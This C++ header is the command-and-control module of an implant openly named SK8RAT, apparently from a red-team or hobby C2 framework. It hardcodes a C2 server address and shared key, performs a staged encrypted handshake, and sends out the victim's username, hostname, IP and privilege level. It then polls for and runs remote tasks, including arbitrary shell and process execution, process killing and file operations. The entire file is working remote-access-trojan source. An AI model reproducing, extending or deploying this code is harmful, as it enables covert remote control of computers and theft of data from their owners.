#ifndef COMMANDCONTROL_H
#define COMMANDCONTROL_H
#include <windows.h>
#include <winhttp.h>
#include <string>
#include "sodium/sodium.h"
#pragma comment (lib,"sodium/libsodium")
#include "base64.h"
#include "Helper.h"
#include "json.hpp"
#include <atlconv.h>
using json = nlohmann::json;
#include "Agent.h"

// Global variables: ip/hostname, port, stage0 uri, stage1 uri, stage2 uri, stage3 uri, beacon uri
// listener_id, symetric key, sleep, jitter
std::string server_ip = "192.168.1.50";
int server_port = 443;
std::string stage0_uri = "/stage0";
std::string stage1_uri = "/stage1";
std::string stage2_uri = "/stage2";
std::string stage3_uri = "/stage3";
std::string get_uri = "/get";
std::string post_uri = "/post";
std::string sharedkey_b64 = "xnlz+IyBxcUXO1ZY3z7qqW65JGU2kCUtib+EnjtaeSw=";
int listener_id = 1;
int sleep = 5;
int jitter = 10;

std::string agent_get_cookie(std::string domain, int port, std::string url, std::string cookie, std::string &response)
{
	std::wstring wstrDomain = GetUTF16(domain, CP_UTF8);
	std::wstring wstrUrl = GetUTF16(url, CP_UTF8);
	std::string agent_return;

	DWORD dwSize = 0;
	DWORD dwDownloaded = 0;
	LPSTR pszOutBuffer;
	BOOL  bResults = FALSE;
	HINTERNET  hSession = NULL,
		hConnect = NULL,
		hRequest = NULL;

	// Use WinHttpOpen to obtain a session handle.
	hSession = WinHttpOpen(L"WinHTTP Example/1.0",
		WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
		WINHTTP_NO_PROXY_NAME,
		WINHTTP_NO_PROXY_BYPASS, 0);

	// Specify an HTTP server.
	if (hSession)
		hConnect = WinHttpConnect(hSession, wstrDomain.c_str(),
			port, 0);

	// Create an HTTP request handle.
	if (hConnect)
		hRequest = WinHttpOpenRequest(hConnect, L"GET", wstrUrl.c_str(),
			NULL, WINHTTP_NO_REFERER,
			WINHTTP_DEFAULT_ACCEPT_TYPES,
			NULL);

	// Send a request, check for cookie
	if (cookie != "")
	{
		std::string headers = "Cookie: macaroon=" + cookie;
		std::wstring wheaders = GetUTF16(headers, CP_UTF8);
		LPCWSTR lpcwheaders = wheaders.c_str();
		DWORD headersLength = wcslen(lpcwheaders);
		if (hRequest)
			bResults = WinHttpSendRequest(hRequest,
				lpcwheaders, headersLength,
				WINHTTP_NO_REQUEST_DATA, 0,
				0, 0);
	}
	else
	{
		if (hRequest)
			bResults = WinHttpSendRequest(hRequest,
				WINHTTP_NO_ADDITIONAL_HEADERS, 0,
				WINHTTP_NO_REQUEST_DATA, 0,
				0, 0);
	}

	// End the request.
	if (bResults)
		bResults = WinHttpReceiveResponse(hRequest, NULL);

	// Keep checking for data until there is nothing left.
	if (bResults)
	{
		do
		{
			// Check for available data.
			dwSize = 0;
			if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
			{
				printf("Error %u in WinHttpQueryDataAvailable.\n",
					GetLastError());
				break;
			}

			// No more available data.
			if (!dwSize)
				break;

			// Allocate space for the buffer.
			pszOutBuffer = new char[dwSize + 1];
			if (!pszOutBuffer)
			{
				printf("Out of memory\n");
				break;
			}

			// Read the Data.
			ZeroMemory(pszOutBuffer, dwSize + 1);

			if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
				dwSize, &dwDownloaded))
			{
				printf("Error %u in WinHttpReadData.\n", GetLastError());
			}
			else
			{
				//printf("Server Response: %s\n", pszOutBuffer);
				std::string stdstr = pszOutBuffer;
				response = stdstr;
			}

			// Free the memory allocated to the buffer.
			delete[] pszOutBuffer;

			// This condition should never be reached since WinHttpQueryDataAvailable
			// reported that there are bits to read.
			if (!dwDownloaded)
				break;

		} while (dwSize > 0);
	}
	else
	{
		// Report any errors.
		printf("Error %d has occurred.\n", GetLastError());
	}

	// Close any open handles.
	if (hRequest) WinHttpCloseHandle(hRequest);
	if (hConnect) WinHttpCloseHandle(hConnect);
	if (hSession) WinHttpCloseHandle(hSession);
	return agent_return;
}

void agent_post_cookie(std::string domain, int port, std::string url, std::string cookie, std::string send, std::string &response)
{
	std::wstring wstrDomain = GetUTF16(domain, CP_UTF8);
	std::wstring wstrUrl = GetUTF16(url, CP_UTF8);
	std::string agent_return;

	DWORD dwSize = 0;
	DWORD dwDownloaded = 0;
	LPSTR pszOutBuffer;
	BOOL  bResults = FALSE;
	HINTERNET  hSession = NULL,
		hConnect = NULL,
		hRequest = NULL;

	// Use WinHttpOpen to obtain a session handle.
	hSession = WinHttpOpen(L"WinHTTP Example/1.0",
		WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
		WINHTTP_NO_PROXY_NAME,
		WINHTTP_NO_PROXY_BYPASS, 0);

	// Specify an HTTP server.
	if (hSession)
		hConnect = WinHttpConnect(hSession, wstrDomain.c_str(),
			port, 0);

	// Create an HTTP request handle.
	if (hConnect)
		hRequest = WinHttpOpenRequest(hConnect, L"POST", wstrUrl.c_str(),
			NULL, WINHTTP_NO_REFERER,
			WINHTTP_DEFAULT_ACCEPT_TYPES,
			NULL);

	// Send a request.
	LPSTR  data = const_cast<char *>(send.c_str());;
	DWORD data_len = strlen(data);

	// Check for cookie
	if (cookie != "")
	{
		std::string headers = "Cookie: macaroon=" + cookie;
		std::wstring wheaders = GetUTF16(headers, CP_UTF8);
		LPCWSTR lpcwheaders = wheaders.c_str();
		DWORD headersLength = wcslen(lpcwheaders);
		if (hRequest)
			bResults = WinHttpSendRequest(hRequest,
				lpcwheaders, headersLength,
				data, data_len,
				data_len, 0);
	}
	else
	{
		DWORD headersLength = -1;
		if (hRequest)
			bResults = WinHttpSendRequest(hRequest,
				WINHTTP_NO_ADDITIONAL_HEADERS, headersLength,
				data, data_len,
				data_len, 0);
	}
	
	// End the request.
	if (bResults)
		bResults = WinHttpReceiveResponse(hRequest, NULL);

	// Keep checking for data until there is nothing left.
	if (bResults)
	{
		do
		{
			// Check for available data.
			dwSize = 0;
			if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
			{
				printf("Error %u in WinHttpQueryDataAvailable.\n",
					GetLastError());
				break;
			}

			// No more available data.
			if (!dwSize)
				break;

			// Allocate space for the buffer.
			pszOutBuffer = new char[dwSize + 1];
			if (!pszOutBuffer)
			{
				printf("Out of memory\n");
				break;
			}

			// Read the Data.
			ZeroMemory(pszOutBuffer, dwSize + 1);

			if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
				dwSize, &dwDownloaded))
			{
				printf("Error %u in WinHttpReadData.\n", GetLastError());
			}
			else
			{
				//printf("Server response: %s\n", pszOutBuffer);
				std::string stdstr = pszOutBuffer;
				response = stdstr;
			}

			// Free the memory allocated to the buffer.
			delete[] pszOutBuffer;

			// This condition should never be reached since WinHttpQueryDataAvailable
			// reported that there are bits to read.
			if (!dwDownloaded)
				break;

		} while (dwSize > 0);
	}
	else
	{
		// Report any errors.
		printf("Error %d has occurred.\n", GetLastError());
	}

	// Close any open handles.
	if (hRequest) WinHttpCloseHandle(hRequest);
	if (hConnect) WinHttpCloseHandle(hConnect);
	if (hSession) WinHttpCloseHandle(hSession);
}

void SK8RAT_EKE(unsigned char symmetrickey[32], std::string &sessioncookie)
{
	// Get hardcoded shared key)
	unsigned char sharedkey[crypto_secretbox_KEYBYTES];
	std::string sharedkey_decoded = base64_decode(sharedkey_b64);
	memcpy(sharedkey, sharedkey_decoded.c_str(), 32);

	// Generate asymetric key pair
	unsigned char client_publickey[crypto_box_PUBLICKEYBYTES];
	unsigned char client_privatekey[crypto_box_SECRETKEYBYTES];
	crypto_box_keypair(client_publickey, client_privatekey);

	// Generate GUID for all further requests
	GUID guid;
	CoCreateGuid(&guid);
	OLECHAR* guidString;
	StringFromCLSID(guid, &guidString);
	USES_CONVERSION;
	std::string sguid_temp = OLE2CA(guidString);
	std::string sguid = sguid_temp.substr(1, sguid_temp.size() - 2);
	::CoTaskMemFree(guidString);

	// Prepare nonce for confidentiality
	unsigned char nonce[crypto_secretbox_NONCEBYTES];
	randombytes_buf(nonce, sizeof nonce);

	// Generate ciphertext
	int ciphertext_len = crypto_secretbox_MACBYTES + crypto_box_PUBLICKEYBYTES;
	unsigned char* ciphertext = new unsigned char[ciphertext_len](); //USE DELETE() WHEN COMPLETE
	int generate_cipher = crypto_secretbox_easy(ciphertext, client_publickey, crypto_box_PUBLICKEYBYTES, nonce, sharedkey);

	// Prepare stage0 message + POST to server
	std::string ciphertext_b64 = base64_encode(ciphertext, ciphertext_len);
	std::string nonce_b64 = base64_encode(nonce, crypto_secretbox_NONCEBYTES);
	std::string send_stage0 = sguid + ":" + nonce_b64 + ":" + ciphertext_b64;

	// Send to server, obtain response
	std::string server_response = "";
	agent_post_cookie(server_ip, server_port, stage0_uri, "", send_stage0, server_response);

	// Clean " at beginning and end bc flask ... also cleans \n
	if (server_response.at(0) == '"')
	{
		server_response.erase(0, 1);
		server_response.erase(server_response.find('"'));
	}

	// Recieve response and decrypt
	std::string sessionkey_encrypted = base64_decode(server_response);
	const unsigned char* csessionkey_encrypted = (const unsigned char *)sessionkey_encrypted.c_str();
	unsigned char* sessionkey = new unsigned char[size(sessionkey_encrypted)](); //USE DELETE() WHEN COMPLETE
	if (crypto_box_seal_open(sessionkey, csessionkey_encrypted, size(sessionkey_encrypted), client_publickey, client_privatekey) != 0) {
		printf("session key decryption failed :(\n");
		return;
	}

	// Generate 4 random bytes for challenge-response
	unsigned char client_challenge[4];
	randombytes_buf(client_challenge, sizeof client_challenge);

	// Prepare nonce for confidentiality
	unsigned char nonce2[crypto_secretbox_NONCEBYTES];
	randombytes_buf(nonce2, sizeof nonce2);

	// Generate ciphertext
	int ciphertext_len2 = crypto_secretbox_MACBYTES + sizeof client_challenge;
	unsigned char* ciphertext2 = new unsigned char[ciphertext_len2](); //USE DELETE() WHEN COMPLETE
	int generate_cipher2 = crypto_secretbox_easy(ciphertext2, client_challenge, sizeof client_challenge, nonce2, sessionkey);

	//Prepare /stage1 message
	std::string ciphertext2_b64 = base64_encode(ciphertext2, ciphertext_len2);
	std::string nonce2_b64 = base64_encode(nonce2, crypto_secretbox_NONCEBYTES);
	std::string send_stage1 = sguid + ":" + nonce2_b64 + ":" + ciphertext2_b64;

	//POST challenge response to /stage1
	std::string server_response2 = "";
	agent_post_cookie(server_ip, server_port, stage1_uri, "", send_stage1, server_response2);

	// Clean " at beginning and end bc flask ... also cleans \n
	if (server_response2.at(0) == '"')
	{
		server_response2.erase(0, 1);
		server_response2.erase(server_response2.find('"'));
	}

	// Parse server response K[client_challenge+server_challenge]
	std::string delimiter = ":";
	std::string nonce3 = base64_decode(server_response2.substr(0, server_response2.find(delimiter)));
	std::string ciphertext3 = base64_decode(server_response2.substr(server_response2.find(":") + 1));
	const unsigned char* cnonce3 = (const unsigned char *)nonce3.c_str();
	const unsigned char* cciphertext3 = (const unsigned char *)ciphertext3.c_str();

	// Decrypt server response with sessionkey
	unsigned char client_server_challenge[8];
	if (crypto_secretbox_open_easy(client_server_challenge, cciphertext3, size(ciphertext3), cnonce3, sessionkey) != 0) {
		printf("challenge-response decryption failed :(\n");
		return;
	}

	// Parse client_server_challenge
	unsigned char client_challenge_returned[4];
	unsigned char server_challenge[4];
	memcpy(client_challenge_returned, client_server_challenge, 4);
	memcpy(server_challenge, client_server_challenge + 4, 4);

	// Compare client_challenge and client_challenge_returned
	if (memcmp(client_challenge, client_challenge_returned, 4))
	{
		printf("client challenge doesn't match, potential MITM!!!\n");
		return;
	}

	// Prepare nonce for confidentiality
	unsigned char nonce_stage2[crypto_secretbox_NONCEBYTES];
	randombytes_buf(nonce_stage2, sizeof nonce_stage2);

	// Generate ciphertext K[server_challenge] to POST to stage2
	int ciphertext_stage2_len = crypto_secretbox_MACBYTES + sizeof server_challenge;
	unsigned char* ciphertext_stage2 = new unsigned char[ciphertext_stage2_len](); //USE DELETE() WHEN COMPLETE
	int generate_ciphertext_stage2 = crypto_secretbox_easy(ciphertext_stage2, server_challenge, sizeof server_challenge, nonce_stage2, sessionkey);

	// Prepare stage2 message
	std::string ciphertext_stage2_b64 = base64_encode(ciphertext_stage2, ciphertext_stage2_len);
	std::string nonce_stage2_b64 = base64_encode(nonce_stage2, crypto_secretbox_NONCEBYTES);
	std::string send_stage2 = sguid + ":" + nonce_stage2_b64 + ":" + ciphertext_stage2_b64;

	// POST K[server_challenge] to /stage2
	std::string server_response3 = "";
	agent_post_cookie(server_ip, server_port, stage2_uri, "", send_stage2, server_response3);

	// If server response is 0, exit
	if (server_response3 == "0\n")
	{
		printf("server challenge doesn't match, potential MITM!!\n");
		return;
	}

	// Clean " at beginning and end bc flask ... also cleans \n
	if (server_response3.at(0) == '"')
	{
		server_response3.erase(0, 1);
		server_response3.erase(server_response3.find('"'));
	}

	// Parse server response
	std::string nonce4 = base64_decode(server_response3.substr(0, server_response3.find(delimiter)));
	std::string ciphertext4 = base64_decode(server_response3.substr(server_response3.find(":") + 1));
	const unsigned char* cnonce4 = (const unsigned char *)nonce4.c_str();
	const unsigned char* cciphertext4 = (const unsigned char *)ciphertext4.c_str();

	// Decode implant's unique session cookie
	unsigned char session_cookie[15];
	if (crypto_secretbox_open_easy(session_cookie, cciphertext4, size(ciphertext4), cnonce4, sessionkey) != 0) {
		printf("session_cookie decryption failed :(\n");
		return;
	}
	std::stringstream temp;
	temp << session_cookie;
	std::string ssessioncookie = temp.str();

	// Create check-in message
	json j;
	j["name"] = nullptr;
	j["guid"] = sguid;
	j["username"] = get_username();
	j["hostname"] = get_computername();
	j["pid"] = get_pid();
	j["internal_ip"] = get_internalip();
	j["external_ip"] = nullptr;
	j["admin"] = is_admin();
	j["os"] = get_version();
	j["task"] = nullptr;
	j["task_output"] = nullptr;
	j["listener_id"] = listener_id;
	j["server_ip"] = server_ip;
	j["sleep"] = sleep;
	j["jitter"] = jitter;
	j["session_key"] = nullptr;
	j["client_challenge"] = nullptr;
	j["server_challenge"] = nullptr;
	j["session_cookie"] = ssessioncookie;
	j["last_seen"] = get_utctime();
	std::string sj = j.dump();
	int sj_size = sj.size();
	const unsigned char * sk8rat_checkin = reinterpret_cast<const unsigned char *> (sj.c_str());

	// Prepare nonce for confidentiality
	unsigned char nonce_stage3[crypto_secretbox_NONCEBYTES];
	randombytes_buf(nonce_stage3, sizeof nonce_stage3);

	// Generate ciphertext for sk8rat first check-in
	int ciphertext_stage3_len = crypto_secretbox_MACBYTES + sj_size;
	unsigned char* ciphertext_stage3 = new unsigned char[ciphertext_stage3_len](); //USE DELETE() WHEN COMPLETE
	int generate_ciphertext_stage3 = crypto_secretbox_easy(ciphertext_stage3, sk8rat_checkin, sj_size, nonce_stage3, sessionkey);

	// Prepare first check-in message
	std::string ciphertext_stage3_b64 = base64_encode(ciphertext_stage3, ciphertext_stage3_len);
	std::string nonce_stage3_b64 = base64_encode(nonce_stage3, crypto_secretbox_NONCEBYTES);
	std::string send_stage3 = nonce_stage3_b64 + ":" + ciphertext_stage3_b64;

	// POST K[sk8rat_checkin] to /stage3
	std::string server_response4 = "";
	agent_post_cookie(server_ip, server_port, stage3_uri, ssessioncookie, send_stage3, server_response4);

	// Pass necessary variables out of function
	memcpy(symmetrickey, sessionkey, 32);
	sessioncookie = ssessioncookie;

	// Clean-up dynamically allocated heap
	delete[] ciphertext;
	delete[] sessionkey;
	delete[] ciphertext2;
	delete[] ciphertext_stage2;
	delete[] ciphertext_stage3;

	// Sleep then return
	SleepJitter(sleep, jitter);
}

void SK8RAT_tasking(unsigned char * symmetrickey, const std::string& sessioncookie)
{
	std::string encrypted_tasking = "";
	agent_get_cookie(server_ip, server_port, get_uri, sessioncookie, encrypted_tasking);

	// Clean " at beginning and end bc flask ... also cleans \n
	if (encrypted_tasking.at(0) == '"')
	{
		encrypted_tasking.erase(0, 1);
		encrypted_tasking.erase(encrypted_tasking.find('"'));
	}

	// Parse server response
	std::string nonce = base64_decode(encrypted_tasking.substr(0, encrypted_tasking.find(':')));
	std::string ciphertext = base64_decode(encrypted_tasking.substr(encrypted_tasking.find(':') + 1));
	const unsigned char* cnonce = (const unsigned char *)nonce.c_str();
	const unsigned char* cciphertext = (const unsigned char *)ciphertext.c_str();

	// Decrypt server response with sessionkey
	unsigned char* server_response = new unsigned char[size(ciphertext)](); //USE DELETE() WHEN COMPLETE

	if (crypto_secretbox_open_easy(server_response, cciphertext, size(ciphertext), cnonce, symmetrickey) != 0) {
		printf("challenge-response decryption failed :(\n");
		SleepJitter(sleep, jitter);
		return; //exits and starts tasking loop again essentially
	}

	// Parse json message
	std::string sserver_response(reinterpret_cast<char*>(server_response));
	json j = json::parse(sserver_response);

	// Update sleep and jitter on SK8RAT
	sleep = j["sleep"];
	jitter = j["jitter"];

	// Count tasks
	int task_count = j["task"].size();

	// Generate thread handle for each task on the heap
	// only needed for long running tasks, will handle later

	// Loop through tasks
	for (int i = 0; i < task_count; i++)
	{
		std::string temp = j["task"][i];
		if (temp.substr(0, 2) == "cd")
		{
			// This whole process is checking for paths with spaces
			std::string arguments = temp.substr(temp.find(' ') + 1);
			std::string arguments_parsed = "";
			for (int i = 0; i < arguments.length(); i++)
			{
				char c = arguments[i];
				if (c == ' ')
				{
					arguments_parsed += "\n";
				}
				else if (c == '\"')
				{
					i++;
					while (arguments[i] != '\"')
					{
						arguments_parsed += arguments[i];
						i++;
					}
				}
				else
				{
					arguments_parsed += c;
				}
			}
			std::string path = arguments_parsed.substr(0, arguments_parsed.find('\n'));
			// Perform the cd, update json blob
			cd(path);
			j["task_output"][i] = "no output";
			j["task_status"][i] = "complete";
			printf("Task %i received, performing cd to %s\n", i, path.c_str());
		}
		if (temp.substr(0, 2) == "cp")
		{
			// This whole process is checking for paths with spaces
			std::string arguments = temp.substr(temp.find(' ') + 1);
			std::string arguments_parsed = "";
			for (int i = 0; i < arguments.length(); i++)
			{
				char c = arguments[i];
				if (c == ' ')
				{
					arguments_parsed += "\n";
				}
				else if (c == '\"')
				{
					i++;
					while (arguments[i] != '\"')
					{
						arguments_parsed += arguments[i];
						i++;
					}
				}
				else
				{
					arguments_parsed += c;
				}
			}
			std::string src_file = arguments_parsed.substr(0, arguments_parsed.find('\n'));
			std::string dest_file = arguments_parsed.substr(arguments_parsed.find('\n') + 1);
			// Perform the cp, update json blob
			cp(src_file, dest_file);
			j["task_output"][i] = "no output";
			j["task_status"][i] = "complete";
			printf("Task %i received, performing cp %s %s\n", i, src_file.c_str(), dest_file.c_str());
		}
		if (temp.substr(0, 2) == "mv")
		{
			// This whole process is checking for paths with spaces
			std::string arguments = temp.substr(temp.find(' ') + 1);
			std::string arguments_parsed = "";
			for (int i = 0; i < arguments.length(); i++)
			{
				char c = arguments[i];
				if (c == ' ')
				{
					arguments_parsed += "\n";
				}
				else if (c == '\"')
				{
					i++;
					while (arguments[i] != '\"')
					{
						arguments_parsed += arguments[i];
						i++;
					}
				}
				else
				{
					arguments_parsed += c;
				}
			}
			std::string src_file = arguments_parsed.substr(0, arguments_parsed.find('\n'));
			std::string dest_file = arguments_parsed.substr(arguments_parsed.find('\n') + 1);
			// Perform the mv, update json blob
			mv(src_file, dest_file);
			j["task_output"][i] = "no output";
			j["task_status"][i] = "complete";
			printf("Task %i received, performing mv %s %s\n", i, src_file.c_str(), dest_file.c_str());
		}
		if (temp == "whoami")
		{
			// Perform pwd and stuff into json blob
			j["task_output"][i] = whoami();
			j["task_status"][i] = "complete";

			printf("Task %i received, performing whoami\n", i);
		}
		if (temp == "pwd")
		{
			// Perform pwd and stuff into json blob
			j["task_output"][i] = pwd();
			j["task_status"][i] = "complete";

			printf("Task %i received, performing pwd\n", i);
		}
		if (temp == "drives")
		{
			// Perform drives and stuff into json blob
			j["task_output"][i] = drives();
			j["task_status"][i] = "complete";

			printf("Task %i received, performing drives\n", i);
		}
		if (temp == "ps")
		{
			// Perform ps and stuff into json blob
			j["task_output"][i] = ps();
			j["task_status"][i] = "complete";

			printf("Task %i received, performing ps\n", i);
		}
		if (temp == "privs")
		{
			// Perform privs and stuff into json blob
			j["task_output"][i] = privs();
			j["task_status"][i] = "complete";

			printf("Task %i received, performing privs\n", i);
		}
		if (temp.substr(0, 2) == "ls")
		{
			std::string path = "";

			// Check for blank path, if path is blank we will ls current dir
			if (temp == "ls")
			{
				path = "";
			}
			else
			{
				path = temp.substr(temp.find(' ') + 1);
			}

			// Perform ls and stuff into json blob
			j["task_output"][i] = ls(path);
			j["task_status"][i] = "complete";
			printf("Task %i received, performing ls %s\n", i, path.c_str());
		}
		if (temp.substr(0, 10) == "shell_exec")
		{
			std::string path = temp.substr(temp.find(' ') + 1);

			// Perform shell_exec and stuff into json blob
			j["task_output"][i] = shell_exec(path);
			j["task_status"][i] = "complete";
			printf("Task %i received, performing shell_exec %s\n", i, path.c_str());
		}
		if (temp.substr(0, 19) == "create_process_exec")
		{
			// Initialize structure on the heap
			createthread_in *ct_create_process_exec_in = new createthread_in(); //DELETE THIS IN THREAD
			ct_create_process_exec_in->j = &j;
			ct_create_process_exec_in->counter = i;
			ct_create_process_exec_in->input = temp.substr(temp.find(' ') + 1);

			// Create thread to perform task and write task output to json at [i]
			CreateThread(0, 0, create_process_exec_thread, ct_create_process_exec_in, 0, 0);
			printf("Using CreateThread() to run 'create_process_exec %s'! ... Task Index: %i\n", (ct_create_process_exec_in->input).c_str(), i);
		}
		if (temp.substr(0, 4) == "kill")
		{
			// Save pid as string, convert to int
			std::string pid_s = temp.substr(temp.find(' ') + 1);
			int pid = std::stoi(pid_s);

			// Perform kill and stuff into json blob
			j["task_output"][i] = kill_process(pid);
			j["task_status"][i] = "complete";
			printf("Task %i received, performing kill %i\n", i, pid);
		}
	}

	// Pause this thread to allow threads to complete, need to figure out how to do this smarter
	// This is literally so dumb, long running jobs will break this architecture
	Sleep(3000);

	// Update last_seen
	j["last_seen"] = get_utctime();

	// Convert json blob to unsigned char
	std::string sj = j.dump();
	int sj_size = sj.size();
	const unsigned char * sk8rat_checkin = reinterpret_cast<const unsigned char *> (sj.c_str());

	// Prepare nonce for confidentiality
	unsigned char nonce_response[crypto_secretbox_NONCEBYTES];
	randombytes_buf(nonce_response, sizeof nonce_response);

	// Generate ciphertext for sk8rat task checkin
	int ciphertext_response_size = crypto_secretbox_MACBYTES + sj_size;
	unsigned char* ciphertext_response = new unsigned char[ciphertext_response_size](); //USE DELETE() WHEN COMPLETE
	int generate_ciphertext_response = crypto_secretbox_easy(ciphertext_response, sk8rat_checkin, sj_size, nonce_response, symmetrickey);

	// Prepare sk8rat task response message
	std::string ciphertext_response_b64 = base64_encode(ciphertext_response, ciphertext_response_size);
	std::string nonce_response_b64 = base64_encode(nonce_response, crypto_secretbox_NONCEBYTES);
	std::string send_response = nonce_response_b64 + ":" + ciphertext_response_b64;

	// POST K[sk8rat_checkin] to /beaconing
	std::string server_response2 = "";
	agent_post_cookie(server_ip, server_port, post_uri, sessioncookie, send_response, server_response2);

	// Clean-up dynamically allocated memory
	delete[] server_response;
	delete[] ciphertext_response;

	// Sleep then return
	printf("Sleeping for %i second(s) with %i%% jitter\n\n", sleep, jitter);
	SleepJitter(sleep, jitter);
}
#endif //COMMANDCONTROL_H